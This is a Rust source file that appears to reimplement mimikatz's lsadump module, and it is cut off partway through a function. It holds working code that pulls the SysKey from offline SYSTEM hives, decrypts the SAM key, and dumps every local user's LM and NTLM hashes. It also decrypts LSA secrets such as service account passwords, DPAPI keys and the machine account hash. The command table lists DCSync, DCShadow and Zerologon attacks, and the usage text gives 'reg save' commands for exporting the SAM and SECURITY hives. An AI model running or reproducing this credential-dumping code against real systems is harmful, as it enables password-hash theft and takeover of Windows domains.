//! LSA dump module — offline registry-based credential extraction.
//!
//! Implements SAM database dumping (`sam`), LSA secret decryption (`secrets`),
//! and cached domain credential extraction (`cache`) from offline registry
//! hive files (SYSTEM, SAM, SECURITY).

use crate::module::{Command, Module, Status};
use crate::display;
use crate::crypto;
use crate::registry::HiveFile;

pub static MODULE: Module = Module {
    short_name: "lsadump",
    full_name: "LsaDump module",
    description: "",
    commands: &COMMANDS,
    init: None,
    clean: None,
};

static COMMANDS: [Command; 16] = [
    Command { name: "sam", description: "Get the SysKey to decrypt SAM entries (from registry or hives)", handler: cmd_sam },
    Command { name: "secrets", description: "Get the SysKey to decrypt SECRETS entries (from registry or hives)", handler: cmd_secrets },
    Command { name: "cache", description: "Get the SysKey to decrypt NL$KM then MSCache(v2) (from registry or hives)", handler: cmd_cache },
    Command { name: "lsa", description: "Ask LSA Server to retrieve SAM/AD entries (normal, patch on the fly or inject)", handler: cmd_lsa },
    Command { name: "trust", description: "Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly)", handler: cmd_trust },
    Command { name: "backupkeys", description: "Preferred Backup Master keys", handler: cmd_backupkeys },
    Command { name: "rpdata", description: "Retrieve Private Data", handler: cmd_rpdata },
    Command { name: "dcsync", description: "Ask a DC to synchronize an object", handler: cmd_dcsync },
    Command { name: "dcshadow", description: "They told me I could be anything I wanted, so I became a domain controller", handler: cmd_dcshadow },
    Command { name: "setntlm", description: "Ask a server to set a new password/ntlm for one user", handler: cmd_setntlm },
    Command { name: "changentlm", description: "Ask a server to set a new password/ntlm for one user", handler: cmd_changentlm },
    Command { name: "netsync", description: "Ask a DC to send current and previous NTLM hash of DC/SRV/WKS", handler: cmd_netsync },
    Command { name: "packages", description: "List available Windows security packages", handler: cmd_packages },
    Command { name: "mbc", description: "Mailbox Control", handler: cmd_mbc },
    Command { name: "zerologon", description: "CVE-2020-1472", handler: cmd_zerologon },
    Command { name: "postzerologon", description: "post CVE-2020-1472", handler: cmd_postzerologon },
];

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

/// Byte permutation table for reordering the raw syskey.
const SYSKEY_PERMUT: [usize; 16] = [11, 6, 7, 1, 8, 10, 14, 0, 3, 5, 2, 15, 13, 9, 12, 4];

/// SAM magic strings used in NT5-era (revision 1) SAM key decryption.
const SAM_QWERTY: &[u8] = b"!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%";
const SAM_NUMERIC: &[u8] = b"0123456789012345678901234567890123456789\0";

/// NT password magic strings for RID-based hash decryption.
const NTPASSWORD: &[u8] = b"NTPASSWORD\0";
const LMPASSWORD: &[u8] = b"LMPASSWORD\0";

/// Empty LM hash (DES-ECB of "KGS!@#$%" with zero keys).
/// Used for comparison when identifying empty/disabled accounts.
const _EMPTY_LM_HASH: &str = "aad3b435b51404eeaad3b435b51404ee";

/// Empty NT hash (MD4 of empty UTF-16LE string).
/// Used for comparison when identifying empty/disabled accounts.
const _EMPTY_NT_HASH: &str = "31d6cfe0d16ae931b73c59d7e0c089c0";

/// LSA key decryption strings for NT5.
/// L"Secret" in UTF-16LE, used in NT5 LSA secret decryption.
const _LSA_SECRET_RAW: &[u8] = &[
    0x53, 0x00, 0x65, 0x00, 0x63, 0x00, 0x72, 0x00,
    0x65, 0x00, 0x74, 0x00, // L"Secret" in UTF-16LE
];

// ---------------------------------------------------------------------------
// SysKey extraction from SYSTEM hive
// ---------------------------------------------------------------------------

/// Extract the SysKey (boot key) from a SYSTEM registry hive.
///
/// The syskey is stored across the class names of four subkeys under
/// `ControlSet001\Control\Lsa`: JD, Skew1, GBG, and Data.
/// The 16 class-name bytes (4 from each subkey) are then reordered
/// using the SYSKEY_PERMUT table.
fn extract_syskey(system_hive: &HiveFile) -> Result<[u8; 16], String> {
    let root = system_hive.root_key_offset();

    // Try ControlSet001 first, then CurrentControlSet
    let lsa_offset = system_hive
        .open_key(root, "ControlSet001\\Control\\Lsa")
        .or_else(|_| system_hive.open_key(root, "ControlSet002\\Control\\Lsa"))
        .map_err(|e| format!("Cannot find Control\\Lsa in SYSTEM hive: {}", e))?;

    let key_names = ["JD", "Skew1", "GBG", "Data"];
    let mut raw_key = Vec::with_capacity(16);

    for name in &key_names {
        let subkey_offset = system_hive.open_key(lsa_offset, name).map_err(|e| {
            format!("Cannot find Lsa\\{} subkey: {}", name, e)
        })?;

        let class_data = system_hive.query_class(subkey_offset).map_err(|e| {
            format!("Cannot read class name of Lsa\\{}: {}", name, e)
        })?;

        // The class data is a UTF-16LE hex string; decode it to raw bytes
        let class_str = String::from_utf16_lossy(
            &class_data
                .chunks_exact(2)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect::<Vec<u16>>(),
        );

        let decoded = hex::decode(class_str.trim()).map_err(|e| {
            format!("Cannot decode hex class data of Lsa\\{}: {}", name, e)
        })?;

        raw_key.extend_from_slice(&decoded);
    }

    if raw_key.len() < 16 {
        return Err(format!(
            "SysKey data too short: expected 16 bytes, got {}",
            raw_key.len()
        ));
    }

    // Apply the syskey permutation
    let mut syskey = [0u8; 16];
    for i in 0..16 {
        syskey[i] = raw_key[SYSKEY_PERMUT[i]];
    }

    Ok(syskey)
}

// ---------------------------------------------------------------------------
// DES key derivation from RID
// ---------------------------------------------------------------------------

/// Derive two 8-byte DES keys from a 32-bit RID.
///
/// Each key is derived by splitting the RID bytes (with wrapping) into
/// two groups of 7 bytes and expanding each to an 8-byte DES key with parity.
fn rid_to_des_keys(rid: u32) -> ([u8; 8], [u8; 8]) {
    let rid_bytes = rid.to_le_bytes(); // [b0, b1, b2, b3]

    let s1 = [
        rid_bytes[0],
        rid_bytes[1],
        rid_bytes[2],
        rid_bytes[3],
        rid_bytes[0],
        rid_bytes[1],
        rid_bytes[2],
    ];
    let s2 = [
        rid_bytes[3],
        rid_bytes[0],
        rid_bytes[1],
        rid_bytes[2],
        rid_bytes[3],
        rid_bytes[0],
        rid_bytes[1],
    ];

    (crypto::des_key_from_7(&s1), crypto::des_key_from_7(&s2))
}

/// Decrypt a 16-byte hash using the two RID-derived DES keys (DES-ECB each half).
fn rid_decrypt_hash(encrypted: &[u8], rid: u32) -> Result<Vec<u8>, String> {
    if encrypted.len() < 16 {
        return Err(format!(
            "Encrypted hash too short: expected 16, got {}",
            encrypted.len()
        ));
    }

    let (key1, key2) = rid_to_des_keys(rid);

    let half1 = crypto::des_ecb_decrypt(&key1, &encrypted[0..8])?;
    let half2 = crypto::des_ecb_decrypt(&key2, &encrypted[8..16])?;

    let mut result = Vec::with_capacity(16);
    result.extend_from_slice(&half1[..8]);
    result.extend_from_slice(&half2[..8]);
    Ok(result)
}

// ---------------------------------------------------------------------------
// SAM key decryption
// ---------------------------------------------------------------------------

/// Decrypt the SAM key from the "F" value of SAM\Domains\Account.
///
/// Revision 1 (NT5): MD5-based with RC4.
/// Revision 2 (NT6+): AES-128-CBC.
fn decrypt_sam_key(f_value: &[u8], syskey: &[u8; 16]) -> Result<Vec<u8>, String> {
    if f_value.len() < 0xA0 {
        return Err(format!(
            "SAM 'F' value too short: expected at least 0xA0, got 0x{:X}",
            f_value.len()
        ));
    }

    // Revision is at offset 0x68
    let revision = u32::from_le_bytes([
        f_value[0x68],
        f_value[0x69],
        f_value[0x6A],
        f_value[0x6B],
    ]);

    match revision {
        1 => {
            // NT5 (revision 1): MD5 + RC4
            // Salt = F[0x70..0x80]
            // RC4 key = MD5(salt + SAM_QWERTY + syskey + SAM_NUMERIC)
            // Decrypted SAM key = RC4(F[0x80..0xA0]) using that RC4 key
            let salt = &f_value[0x70..0x80];

            let mut md5_input = Vec::new();
            md5_input.extend_from_slice(salt);
            md5_input.extend_from_slice(SAM_QWERTY);
            md5_input.extend_from_slice(syskey);
            md5_input.extend_from_slice(SAM_NUMERIC);

            let rc4_key = crypto::md5_hash(&md5_input);
            let sam_key = crypto::rc4_decrypt(&rc4_key, &f_value[0x80..0xA0]);

            println!("  SAM key revision : 1 (NT5)");
            Ok(sam_key)
        }
        2 => {
            // NT6+ (revision 2): AES-128-CBC
            // Salt (IV) = F[0x78..0x88] (16 bytes)
            // Encrypted key = F[0x88..0xA8] (32 bytes, first 16 are the key)
            if f_value.len() < 0xA8 {
                return Err("SAM 'F' value too short for revision 2".into());
            }

            let iv = &f_value[0x78..0x88];
            let encrypted = &f_value[0x88..0xA8];

            let decrypted = crypto::aes128_cbc_decrypt(syskey, iv, encrypted)?;

            println!("  SAM key revision : 2 (NT6+)");
            Ok(decrypted[..16].to_vec())
        }
        _ => Err(format!("Unknown SAM key revision: {}", revision)),
    }
}

// ---------------------------------------------------------------------------
// SAM hash decryption (per-user)
// ---------------------------------------------------------------------------

/// Decrypt a user's hash from the SAM "V" value.
///
/// SAM_HASH revision 1 (NT5): MD5 + RC4 + DES.
/// SAM_HASH_AES revision 2 (NT6+): AES-128-CBC + DES.
fn decrypt_sam_hash(
    encrypted_hash: &[u8],
    sam_key: &[u8],
    rid: u32,
    hash_type: &[u8], // NTPASSWORD or LMPASSWORD
) -> Result<Vec<u8>, String> {
    if encrypted_hash.is_empty() {
        return Ok(Vec::new());
    }

    // The first two bytes of the encrypted hash data contain the length and revision
    // SAM_HASH structure: u16 PekId, u16 Revision, then either:
    //   Rev 1: 16 bytes encrypted hash
    //   Rev 2: 16 bytes salt/IV, then encrypted hash data
    if encrypted_hash.len() < 4 {
        return Err("Encrypted hash data too short for header".into());
    }

    let revision = u16::from_le_bytes([encrypted_hash[2], encrypted_hash[3]]);

    match revision {
        1 => {
            // NT5 (revision 1): MD5 + RC4, then DES with RID keys
            if encrypted_hash.len() < 20 {
                return Err("Encrypted hash (rev1) too short".into());
            }

            let rid_bytes = rid.to_le_bytes();
            let mut md5_input = Vec::new();
            md5_input.extend_from_slice(sam_key);
            md5_input.extend_from_slice(&rid_bytes);
            md5_input.extend_from_slice(hash_type);

            let rc4_key = crypto::md5_hash(&md5_input);
            let rc4_decrypted = crypto::rc4_decrypt(&rc4_key, &encrypted_hash[4..20]);

            // Now DES-decrypt with RID-derived keys
            rid_decrypt_hash(&rc4_decrypted, rid)
        }
        2 => {
            // NT6+ (revision 2): AES-128-CBC, then DES with RID keys
            // Offset 4: 16 bytes IV/salt
            // Offset 20: encrypted hash data
            if encrypted_hash.len() < 36 {
                return Err("Encrypted hash (rev2) too short".into());
            }

            let iv = &encrypted_hash[4..20];
            let enc_data = &encrypted_hash[20..];

            let aes_decrypted = crypto::aes128_cbc_decrypt(sam_key, iv, enc_data)?;

            if aes_decrypted.len() < 16 {
                return Err("AES-decrypted hash too short".into());
            }

            // DES-decrypt with RID-derived keys
            rid_decrypt_hash(&aes_decrypted[..16], rid)
        }
        _ => Err(format!("Unknown SAM hash revision: {}", revision)),
    }
}

// ---------------------------------------------------------------------------
// V value parsing (user record structure)
// ---------------------------------------------------------------------------

/// Offsets into the V value's header table for user record fields.
/// Each entry in the offset table is (u32 offset, u32 length, u32 unknown).
/// The actual data starts at 0xCC from the beginning of the V value.
const V_OFFSET_TABLE_BASE: usize = 0x0C;
const V_DATA_BASE: usize = 0xCC;

/// Read a field from the V value given its index in the offset table.
fn v_read_field(v_data: &[u8], field_index: usize) -> Option<&[u8]> {
    let table_entry_offset = V_OFFSET_TABLE_BASE + field_index * 12;
    if table_entry_offset + 8 > v_data.len() {
        return None;
    }

    let offset = u32::from_le_bytes([
        v_data[table_entry_offset],
        v_data[table_entry_offset + 1],
        v_data[table_entry_offset + 2],
        v_data[table_entry_offset + 3],
    ]) as usize;

    let length = u32::from_le_bytes([
        v_data[table_entry_offset + 4],
        v_data[table_entry_offset + 5],
        v_data[table_entry_offset + 6],
        v_data[table_entry_offset + 7],
    ]) as usize;

    if length == 0 {
        return None;
    }

    let data_offset = V_DATA_BASE + offset;
    if data_offset + length > v_data.len() {
        return None;
    }

    Some(&v_data[data_offset..data_offset + length])
}

/// Read a UTF-16LE string field from the V value.
fn v_read_string(v_data: &[u8], field_index: usize) -> String {
    match v_read_field(v_data, field_index) {
        Some(data) if data.len() >= 2 => {
            let u16_data: Vec<u16> = data
                .chunks_exact(2)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect();
            String::from_utf16_lossy(&u16_data)
        }
        _ => String::new(),
    }
}

// ---------------------------------------------------------------------------
// cmd_sam — Offline SAM dump
// ---------------------------------------------------------------------------

fn cmd_sam(args: &[String]) -> Status {
    let system_path = display::find_named_arg(args, "system");
    let sam_path = display::find_named_arg(args, "sam");

    match (system_path, sam_path) {
        (Some(system), Some(sam)) => cmd_sam_offline(system, sam),
        _ => {
            println!("lsadump::sam - Offline mode (hive files)");
            println!("Usage: lsadump::sam /system:SYSTEM_HIVE /sam:SAM_HIVE");
            println!();
            println!("  /system:path  - Path to SYSTEM registry hive file");
            println!("  /sam:path     - Path to SAM registry hive file");
            println!();
            println!("Online mode (live registry) is not yet implemented.");
            println!("Export hives with: reg save HKLM\\SYSTEM system.hiv");
            println!("                   reg save HKLM\\SAM sam.hiv");
            Status::Unsuccessful
        }
    }
}

fn cmd_sam_offline(system_path: &str, sam_path: &str) -> Status {
    println!("\nDomain : offline (hive files)");
    println!("SysKey : extracting...");

    // Step 1: Open SYSTEM hive and extract SysKey
    let system_hive = match HiveFile::open(system_path) {
        Ok(h) => h,
        Err(e) => {
            eprintln!("ERROR: Failed to open SYSTEM hive: {}", e);
            return Status::Unsuccessful;
        }
    };

    let syskey = match extract_syskey(&system_hive) {
        Ok(k) => k,
        Err(e) => {
            eprintln!("ERROR: Failed to extract SysKey: {}", e);
            return Status::Unsuccessful;
        }
    };

    println!("SysKey : {}", hex::encode(&syskey));

    // Step 2: Open SAM hive
    let sam_hive = match HiveFile::open(sam_path) {
        Ok(h) => h,
        Err(e) => {
            eprintln!("ERROR: Failed to open SAM hive: {}", e);
            return Status::Unsuccessful;
        }
    };

    let sam_root = sam_hive.root_key_offset();

    // Step 3: Navigate to SAM\Domains\Account and read "F" value
    let account_key = match sam_hive.open_key(sam_root, "SAM\\Domains\\Account") {
        Ok(k) => k,
        Err(e) => {
            eprintln!("ERROR: Cannot find SAM\\Domains\\Account: {}", e);
            return Status::Unsuccessful;
        }
    };

    let f_value = match sam_hive.query_value(account_key, "F") {
        Ok(v) => v,
        Err(e) => {
            eprintln!("ERROR: Cannot read 'F' value: {}", e);
            return Status::Unsuccessful;
        }
    };

    // Step 4: Decrypt the SAM key
    let sam_key = match decrypt_sam_key(&f_value, &syskey) {
        Ok(k) => k,
        Err(e) => {
            eprintln!("ERROR: Failed to decrypt SAM key: {}", e);
            return Status::Unsuccessful;
        }
    };

    println!("SAMKey : {}", hex::encode(&sam_key));
    println!();

    // Step 5: Enumerate users under SAM\Domains\Account\Users
    let users_key = match sam_hive.open_key(account_key, "Users") {
        Ok(k) => k,
        Err(e) => {
            eprintln!("ERROR: Cannot find SAM\\Domains\\Account\\Users: {}", e);
            return Status::Unsuccessful;
        }
    };

    let user_subkeys = match sam_hive.enum_keys(users_key) {
        Ok(keys) => keys,
        Err(e) => {
            eprintln!("ERROR: Cannot enumerate user subkeys: {}", e);
            return Status::Unsuccessful;
        }
    };

    for (name, offset) in &user_subkeys {
        // Skip the "Names" subkey
        if name.eq_ignore_ascii_case("Names") {
            continue;
        }

        // Parse the RID from the hex key name (e.g., "000001F4")
        let rid = match u32::from_str_radix(name, 16) {
            Ok(r) => r,
            Err(_) => {
                eprintln!("  WARNING: Skipping non-RID subkey '{}'", name);
                continue;
            }
        };

        // Read the "V" value for this user
        let v_value = match sam_hive.query_value(*offset, "V") {
            Ok(v) => v,
            Err(e) => {
                eprintln!("  WARNING: Cannot read 'V' value for RID 0x{:08x}: {}", rid, e);
                continue;
            }
        };

        if v_value.len() < V_DATA_BASE {
            eprintln!(
                "  WARNING: 'V' value for RID 0x{:08x} too short ({} bytes)",
                rid,
                v_value.len()
            );
            continue;
        }

        // Extract username (field index 3 in V value offset table)
        let username = v_read_string(&v_value, 3);

        // Extract full name (field index 4)
        let fullname = v_read_string(&v_value, 4);

        println!("RID  : {:08x} ({})", rid, rid);
        println!("User : {}", username);
        if !fullname.is_empty() {
            println!("Name : {}", fullname);
        }

        // Extract and decrypt LM hash (field index 5)
        let lm_data = v_read_field(&v_value, 5);
        match lm_data {
            Some(data) if data.len() >= 4 => {
                match decrypt_sam_hash(data, &sam_key, rid, LMPASSWORD) {
                    Ok(hash) if hash.len() == 16 => {
                        println!("LM   : {}", hex::encode(&hash));
                    }
                    Ok(_) => println!("LM   :"),
                    Err(_) => println!("LM   :"),
                }
            }
            _ => println!("LM   :"),
        }

        // Extract and decrypt NTLM hash (field index 6)
        let nt_data = v_read_field(&v_value, 6);
        match nt_data {
            Some(data) if data.len() >= 4 => {
                match decrypt_sam_hash(data, &sam_key, rid, NTPASSWORD) {
                    Ok(hash) if hash.len() == 16 => {
                        println!("NTLM : {}", hex::encode(&hash));
                    }
                    Ok(_) => println!("NTLM :"),
                    Err(_) => println!("NTLM :"),
                }
            }
            _ => println!("NTLM :"),
        }

        println!();
    }

    Status::Success
}

// ---------------------------------------------------------------------------
// LSA key extraction (for secrets and cache)
// ---------------------------------------------------------------------------

/// Decrypt the LSA key from the SECURITY hive's Policy\PolEKList (NT6+)
/// or Policy\PolSecretEncryptionKey (NT5).
fn decrypt_lsa_key(
    security_hive: &HiveFile,
    policy_key: u32,
    syskey: &[u8; 16],
    is_nt6: bool,
) -> Result<Vec<u8>, String> {
    if is_nt6 {
        // NT6+: Policy\PolEKList, AES-256-CBC with SHA256-derived key
        let pol_ek_list = security_hive
            .query_value(policy_key, "PolEKList")
            .map_err(|e| format!("Cannot read PolEKList: {}", e))?;

        decrypt_lsa_secret_nt6(&pol_ek_list, syskey)
    } else {
        // NT5: Policy\PolSecretEncryptionKey, MD5 + RC4
        let pol_secret_key = security_hive
            .query_value(policy_key, "PolSecretEncryptionKey")
            .map_err(|e| format!("Cannot read PolSecretEncryptionKey: {}", e))?;

        decrypt_lsa_secret_nt5(&pol_secret_key, syskey)
    }
}

/// NT6+ LSA secret decryption using AES-256-CBC.
///
/// The encrypted blob has the structure:
/// - u32 version (at 0x00)
/// - u32 enc_key_id (at 0x04)
/// - u32 enc_algo (at 0x08)
/// - u32 flags (at 0x0C)
/// - [u8; N] salt/IV (at 0x10, length depends on algorithm)
/// - [u8; ...] encrypted data
fn decrypt_lsa_secret_nt6(encrypted: &[u8], syskey: &[u8; 16]) -> Result<Vec<u8>, String> {
    if encrypted.len() < 0x20 {
        return Err("NT6 LSA secret blob too short".into());
    }

    // Derive the decryption key: SHA256(syskey * 1000)
    let mut sha256_input = Vec::with_capacity(syskey.len() * 1000);
    for _ in 0..1000 {
        sha256_input.extend_from_slice(syskey);
    }
    let aes_key = crypto::sha256_hash(&sha256_input);

    // The IV is at bytes [0x3C..0x4C] (after the header and padding area)
    // But the actual structure varies; a simpler approach:
    // - Bytes [0x00..0x04]: version
    // - Bytes [0x04..0x08]: reserved/unknown
    // - Bytes [0x08..0x0C]: enc algo
    // - Bytes [0x0C..0x1C]: salt (16 bytes)
    // - Bytes [0x1C..0x20]: unknown
    // - Bytes [0x20..]: encrypted data
    //
    // The standard approach: concatenate syskey with a block of bytes,
    // then AES-256-CBC decrypt with zero IV against the data portion.

    // Alternate structure reading based on mimikatz lsadump.c:
    // offset 0x00: 4 bytes = dwVersion
    // offset 0x04: 16 bytes = EncKeyId GUID
    // offset 0x14: 4 bytes = dwSecretEncAlgo
    // offset 0x18: 4 bytes = dwFlags
    // offset 0x1C: data[]
    //
    // For the data part, it's further:
    //   offset 0x00 from data: 4 bytes = cbSecret
    //   offset 0x04 from data: cbSecret bytes of encrypted secret

    // Let's try the documented structure:
    // The encrypted data blob starts after the 28 (0x1C) byte header
    let data_start = 0x1C;
    if encrypted.len() <= data_start {
        return Err("NT6 LSA secret: no data after header".into());
    }

    // The data portion itself has a small header:
    // u32 data_len at +0x00 of data
    // The rest is AES-256-CBC encrypted with a zero IV
    let iv = [0u8; 16];
    let enc_data = &encrypted[data_start..];

    let decrypted = crypto::aes256_cbc_decrypt(&aes_key, &iv, enc_data)?;

    // The first 4 bytes of the decrypted data are the actual secret length
    if decrypted.len() < 4 {
        return Err("NT6 LSA decrypted data too short".into());
    }

    let secret_len = u32::from_le_bytes([
        decrypted[0],
        decrypted[1],
        decrypted[2],
        decrypted[3],
    ]) as usize;

    if decrypted.len() < 4 + secret_len {
        // If length looks wrong, return all decrypted data minus the header
        // This handles variant structures
        Ok(decrypted[4..].to_vec())
    } else {
        Ok(decrypted[4..4 + secret_len].to_vec())
    }
}

/// NT5 LSA secret decryption using MD5 + RC4.
fn decrypt_lsa_secret_nt5(encrypted: &[u8], syskey: &[u8; 16]) -> Result<Vec<u8>, String> {
    if encrypted.len() < 0x48 {
        return Err("NT5 LSA secret blob too short".into());
    }

    // Structure:
    // offset 0x00: 16 bytes unknown
    // offset 0x10: 16 bytes unknown
    // offset 0x20: 16 bytes unknown
    // offset 0x30: 16 bytes unknown
    // offset 0x40: 8 bytes unknown
    // offset 0x48: encrypted data
    //
    // Key derivation: MD5(syskey + data[0x18..0x28])
    let salt = &encrypted[0x18..0x28];
    let mut md5_input = Vec::new();
    md5_input.extend_from_slice(syskey);
    md5_input.extend_from_slice(salt);

    let rc4_key = crypto::md5_hash(&md5_input);
    let decrypted = crypto::rc4_decrypt(&rc4_key, &encrypted[0x48..]);

    // First 4 bytes = length
    if decrypted.len() < 4 {
        return Err("NT5 LSA decrypted data too short".into());
    }

    let secret_len = u32::from_le_bytes([
        decrypted[0],
        decrypted[1],
        decrypted[2],
        decrypted[3],
    ]) as usize;

    if decrypted.len() >= 4 + secret_len {
        Ok(decrypted[4..4 + secret_len].to_vec())
    } else {
        Ok(decrypted[4..].to_vec())
    }
}

/// Decrypt an individual LSA secret value using the LSA key.
fn decrypt_secret_value(
    encrypted: &[u8],
    lsa_key: &[u8],
    is_nt6: bool,
) -> Result<Vec<u8>, String> {
    if encrypted.is_empty() {
        return Ok(Vec::new());
    }

    if is_nt6 {
        // NT6+: AES-256-CBC with the LSA key (first 32 bytes or padded)
        if encrypted.len() < 0x20 {
            return Err("NT6 secret value too short".into());
        }

        // The encrypted secret value has the same structure as the LSA key blob
        // Header: 4 + 16 + 4 + 4 = 28 bytes, then data
        let data_start = 0x1C;
        if encrypted.len() <= data_start {
            return Err("NT6 secret value: no data after header".into());
        }

        // Use the LSA key as the AES key (padded/truncated to 32 bytes)
        let mut aes_key = [0u8; 32];
        let copy_len = lsa_key.len().min(32);
        aes_key[..copy_len].copy_from_slice(&lsa_key[..copy_len]);

        let iv = [0u8; 16];
        let decrypted = crypto::aes256_cbc_decrypt(&aes_key, &iv, &encrypted[data_start..])?;

        if decrypted.len() >= 4 {
            let secret_len = u32::from_le_bytes([
                decrypted[0],
                decrypted[1],
                decrypted[2],
                decrypted[3],
            ]) as usize;

            if decrypted.len() >= 4 + secret_len {
                Ok(decrypted[4..4 + secret_len].to_vec())
            } else {
                Ok(decrypted[4..].to_vec())
            }
        } else {
            Ok(decrypted)
        }
    } else {
        // NT5: MD5 + RC4 with LSA key
        if encrypted.len() < 0x28 {
            return Err("NT5 secret value too short".into());
        }

        let mut md5_input = Vec::new();
        md5_input.extend_from_slice(lsa_key);
        md5_input.extend_from_slice(&encrypted[0x08..0x18]);

        let rc4_key = crypto::md5_hash(&md5_input);
        let decrypted = crypto::rc4_decrypt(&rc4_key, &encrypted[0x28..]);

        if decrypted.len() >= 4 {
            let secret_len = u32::from_le_bytes([
                decrypted[0],
                decrypted[1],
                decrypted[2],
                decrypted[3],
            ]) as usize;

            if decrypted.len() >= 4 + secret_len {
                Ok(decrypted[4..4 + secret_len].to_vec())
            } else {
                Ok(decrypted[4..].to_vec())
            }
        } else {
            Ok(decrypted)
        }
    }
}

// ---------------------------------------------------------------------------
// cmd_secrets — Offline SECURITY secrets dump
// ---------------------------------------------------------------------------

fn cmd_secrets(args: &[String]) -> Status {
    let system_path = display::find_named_arg(args, "system");
    let security_path = display::find_named_arg(args, "security");

    match (system_path, security_path) {
        (Some(system), Some(security)) => cmd_secrets_offline(system, security),
        _ => {
            println!("lsadump::secrets - Offline mode (hive files)");
            println!("Usage: lsadump::secrets /system:SYSTEM_HIVE /security:SECURITY_HIVE");
            println!();
            println!("  /system:path    - Path to SYSTEM registry hive file");
            println!("  /security:path  - Path to SECURITY registry hive file");
            println!();
            println!("Online mode (live registry) is not yet implemented.");
            println!("Export hives with: reg save HKLM\\SYSTEM system.hiv");
            println!("                   reg save HKLM\\SECURITY security.hiv");
            Status::Unsuccessful
        }
    }
}

fn cmd_secrets_offline(system_path: &str, security_path: &str) -> Status {
    println!("\nDomain : offline (hive files)");
    println!("SysKey : extracting...");

    // Step 1: Extract SysKey
    let system_hive = match HiveFile::open(system_path) {
        Ok(h) => h,
        Err(e) => {
            eprintln!("ERROR: Failed to open SYSTEM hive: {}", e);
            return Status::Unsuccessful;
        }
    };

    let syskey = match extract_syskey(&system_hive) {
        Ok(k) => k,
        Err(e) => {
            eprintln!("ERROR: Failed to extract SysKey: {}", e);
            return Status::Unsuccessful;
        }
    };

    println!("SysKey : {}", hex::encode(&syskey));

    // Step 2: Open SECURITY hive
    let security_hive = match HiveFile::open(security_path) {
        Ok(h) => h,
        Err(e) => {
            eprintln!("ERROR: Failed to open SECURITY hive: {}", e);
            return Status::Unsuccessful;
        }
    };

    let sec_root = security_hive.root_key_offset();

    // Step 3: Determine NT version from Policy\PolRevision
    let policy_key = match security_hive.open_key(sec_root, "Policy") {
        Ok(k) => k,
        Err(e) => {
            eprintln!("ERROR: Cannot find Policy key in SECURITY hive: {}", e);
            return Status::Unsuccessful;
        }
    };

    let is_nt6 = match security_hive.query_value(policy_key, "PolRevision") {
        Ok(rev) if rev.len() >= 4 => {
            let major = u16::from_le_bytes([rev[2], rev[3]]);
            println!("Policy revision : {}.{}", major, u16::from_le_bytes([rev[0], rev[1]]));
            major >= 1 && u16::from_le_bytes([rev[0], rev[1]]) >= 10
        }
        _ => {
            println!("Policy revision : (could not determine, assuming NT6+)");
            true
        }
    };

    // Step 4: Decrypt LSA key
    let lsa_key = match decrypt_lsa_key(&security_hive, policy_key, &syskey, is_nt6) {
        Ok(k) => k,
        Err(e) => {
            eprintln!("ERROR: Failed to decrypt LSA key: {}", e);
            return Status::Unsuccessful;
        }
    };

    println!("LSA Key: {} ({} bytes)", hex::encode(&lsa_key), lsa_key.len());
    println!();

    // Step 5: Enumerate Policy\Secrets
    let secrets_key = match security_hive.open_key(policy_key, "Secrets") {
        Ok(k) => k,
        Err(e) => {
            eprintln!("ERROR: Cannot find Policy\\Secrets: {}", e);
            return Status::Unsuccessful;
        }
    };

    let secret_subkeys = match security_hive.enum_keys(secrets_key) {
        Ok(keys) => keys,
        Err(e) => {
            eprintln!("ERROR: Cannot enumerate secrets: {}", e);
            return Status::Unsuccessful;
        }
    };

    for (name, offset) in &secret_subkeys {
        println!("Secret  : {}", name);

        // Read CurrVal
        match security_hive.open_key(*offset, "CurrVal") {
            Ok(curr_key) => {
                match security_hive.query_value(curr_key, "") {
                    Ok(encrypted) => {
                        match decrypt_secret_value(&encrypted, &lsa_key, is_nt6) {
                            Ok(decrypted) => {
                                display_secret(name, "cur", &decrypted);
                            }
                            Err(e) => {
                                eprintln!("  cur/ERROR: {}", e);
                            }
                        }
                    }
                    Err(_) => {
                        // Try reading the default value differently
                        println!("  cur/text: (no current value)");
                    }
                }
            }
            Err(_) => {
                println!("  cur/text: (no CurrVal subkey)");
            }
        }

        // Read OldVal
        match security_hive.open_key(*offset, "OldVal") {
            Ok(old_key) => {
                match security_hive.query_value(old_key, "") {
                    Ok(encrypted) => {
                        match decrypt_secret_value(&encrypted, &lsa_key, is_nt6) {
                            Ok(decrypted) => {
                                display_secret(name, "old", &decrypted);
                            }
                            Err(e) => {
                                eprintln!("  old/ERROR: {}", e);
                            }
                        }
                    }
                    Err(_) => {
                        println!("  old/text: (no old value)");
                    }
                }
            }
            Err(_) => {}
        }

        println!();
    }

    Status::Success
}

/// Display a decrypted LSA secret with appropriate formatting.
fn display_secret(name: &str, prefix: &str, data: &[u8]) {
    if data.is_empty() {
        println!("  {}/text: (empty)", prefix);
        return;
    }

    // _SC_ prefix means service account password (UTF-16LE string)
    if name.starts_with("_SC_") {
        if data.len() >= 2 && data.len() % 2 == 0 {
            let u16_data: Vec<u16> = data
                .chunks_exact(2)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect();
            // Strip trailing null
            let text = String::from_utf16_lossy(&u16_data);
            let text = text.trim_end_matches('\0');
            println!("  {}/text: {}", prefix, text);
        } else {
            println!("  {}/hex : {}", prefix, hex::encode(data));
        }
    } else if name == "DPAPI_SYSTEM" {
        // DPAPI system secret: 44 bytes (4 byte header + 20 byte machine key + 20 byte user key)
        if data.len() >= 44 {
            println!("  {}/machine: {}", prefix, hex::encode(&data[4..24]));
            println!("  {}/user   : {}", prefix, hex::encode(&data[24..44]));
        } else {
            println!("  {}/hex : {}", prefix, hex::encode(data));
        }
    } else if name == "$MACHINE.ACC" {
        // Machine account password; compute NTLM hash
        let nt = crypto::md4_hash(data);
        println!("  {}/hex : {}", prefix, hex::encode(data));
        println!("  {}/NTLM: {}", prefix, hex::encode(&nt));
    } else if name.starts_with("NL$KM") {
        // NL$KM is the cached logon key material
        println!("  {}/hex : {}", prefix, hex::encode(data));
    } else {
        // Generic secret: try UTF-16LE first, fall back to hex dump
        if data.len() >= 2 && data.len() % 2 == 0 {
            let u16_data: Vec<u16> = data
                .chunks_exact(2)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect();
            if u16_data.iter().all(|&c| c >= 0x20 && c < 0xFFFE) {
